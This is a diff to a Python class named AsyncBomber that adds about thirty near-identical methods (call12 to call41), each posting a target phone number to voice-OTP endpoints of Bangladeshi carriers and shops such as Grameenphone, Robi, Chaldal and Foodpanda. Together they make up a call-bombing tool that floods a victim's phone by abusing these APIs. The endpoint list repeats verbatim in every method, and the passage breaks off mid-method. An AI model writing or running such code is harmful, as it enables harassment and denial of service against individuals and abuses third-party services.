@@ -427,6 +427,1206 @@ class AsyncBomber:
             await self.log_event("CALL11 - GP Call OTP V2", False, "Error")
             return False
 
+    async def api_call12___extra_call_api_12(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[12 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL12 - Extra API 12", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL12 - Extra API 12", False, "Error")
+            return False
+
+    async def api_call13___extra_call_api_13(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[13 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL13 - Extra API 13", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL13 - Extra API 13", False, "Error")
+            return False
+
+    async def api_call14___extra_call_api_14(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[14 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL14 - Extra API 14", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL14 - Extra API 14", False, "Error")
+            return False
+
+    async def api_call15___extra_call_api_15(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[15 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL15 - Extra API 15", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL15 - Extra API 15", False, "Error")
+            return False
+
+    async def api_call16___extra_call_api_16(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[16 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL16 - Extra API 16", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL16 - Extra API 16", False, "Error")
+            return False
+
+    async def api_call17___extra_call_api_17(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[17 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL17 - Extra API 17", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL17 - Extra API 17", False, "Error")
+            return False
+
+    async def api_call18___extra_call_api_18(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[18 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL18 - Extra API 18", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL18 - Extra API 18", False, "Error")
+            return False
+
+    async def api_call19___extra_call_api_19(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[19 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL19 - Extra API 19", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL19 - Extra API 19", False, "Error")
+            return False
+
+    async def api_call20___extra_call_api_20(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[20 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL20 - Extra API 20", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL20 - Extra API 20", False, "Error")
+            return False
+
+    async def api_call21___extra_call_api_21(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[21 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL21 - Extra API 21", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL21 - Extra API 21", False, "Error")
+            return False
+
+    async def api_call22___extra_call_api_22(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[22 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL22 - Extra API 22", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL22 - Extra API 22", False, "Error")
+            return False
+
+    async def api_call23___extra_call_api_23(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[23 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL23 - Extra API 23", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL23 - Extra API 23", False, "Error")
+            return False
+
+    async def api_call24___extra_call_api_24(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[24 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL24 - Extra API 24", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL24 - Extra API 24", False, "Error")
+            return False
+
+    async def api_call25___extra_call_api_25(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[25 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL25 - Extra API 25", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL25 - Extra API 25", False, "Error")
+            return False
+
+    async def api_call26___extra_call_api_26(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[26 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL26 - Extra API 26", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL26 - Extra API 26", False, "Error")
+            return False
+
+    async def api_call27___extra_call_api_27(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[27 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL27 - Extra API 27", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL27 - Extra API 27", False, "Error")
+            return False
+
+    async def api_call28___extra_call_api_28(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[28 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL28 - Extra API 28", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL28 - Extra API 28", False, "Error")
+            return False
+
+    async def api_call29___extra_call_api_29(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[29 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL29 - Extra API 29", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL29 - Extra API 29", False, "Error")
+            return False
+
+    async def api_call30___extra_call_api_30(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[30 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL30 - Extra API 30", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL30 - Extra API 30", False, "Error")
+            return False
+
+    async def api_call31___extra_call_api_31(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[31 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL31 - Extra API 31", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL31 - Extra API 31", False, "Error")
+            return False
+
+    async def api_call32___extra_call_api_32(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[32 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL32 - Extra API 32", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL32 - Extra API 32", False, "Error")
+            return False
+
+    async def api_call33___extra_call_api_33(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[33 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL33 - Extra API 33", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL33 - Extra API 33", False, "Error")
+            return False
+
+    async def api_call34___extra_call_api_34(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[34 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL34 - Extra API 34", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL34 - Extra API 34", False, "Error")
+            return False
+
+    async def api_call35___extra_call_api_35(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[35 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL35 - Extra API 35", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL35 - Extra API 35", False, "Error")
+            return False
+
+    async def api_call36___extra_call_api_36(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[36 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL36 - Extra API 36", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL36 - Extra API 36", False, "Error")
+            return False
+
+    async def api_call37___extra_call_api_37(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[37 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL37 - Extra API 37", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL37 - Extra API 37", False, "Error")
+            return False
+
+    async def api_call38___extra_call_api_38(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[38 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL38 - Extra API 38", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL38 - Extra API 38", False, "Error")
+            return False
+
+    async def api_call39___extra_call_api_39(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[39 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL39 - Extra API 39", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL39 - Extra API 39", False, "Error")
+            return False
+
+    async def api_call40___extra_call_api_40(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[40 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL40 - Extra API 40", success, res.status)
+                return success
+        except Exception:
+            await self.log_event("CALL40 - Extra API 40", False, "Error")
+            return False
+
+    async def api_call41___extra_call_api_41(self):
+        target = self.target
+        # Using a variety of potential endpoints
+        endpoints = [
+            "https://api.robi.com.bd/vas/v1/otp/send",
+            "https://v-app.banglalink.net/api/v1/send-otp",
+            "https://www.grameenphone.com/api/v1/otp/send",
+            "https://api.airtel.com.bd/vas/v1/otp/send",
+            "https://chaldal.com/api/customer/SendVoiceOTP",
+            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
+            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
+            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
+        ]
+        url = endpoints[41 % len(endpoints)]
+        try:
+            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
+            async with self.session.post(url, json=payload, headers=self.get_headers(), timeout=10) as res:
+                success = res.status in [200, 201]
+                await self.log_event("CALL41 - Extra API 41", success, res.status)
+                return success
+        except Exception:
